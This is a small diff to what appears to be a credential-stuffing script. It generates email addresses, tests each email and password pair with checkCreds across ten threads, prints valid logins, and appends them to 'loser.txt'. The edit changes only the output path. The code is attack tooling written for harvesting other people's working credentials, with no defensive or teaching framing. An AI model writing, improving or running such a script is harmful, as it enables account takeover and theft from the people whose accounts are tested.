@@ -54,7 +54,7 @@ def check_credentials(email, password):
         if checkCreds(email, password):
             print("Valid credentials found!")
             print("Email: {}, Password: {}".format(email, password))
-            with open("/Users/lung/Desktop/loser.txt", "a") as file:
+            with open("loser.txt", "a") as file:
                 file.write("Email: {}, Password: {}\n".format(email, password))
 with ThreadPoolExecutor(max_workers=10) as executor:
     for email in emailMaker():
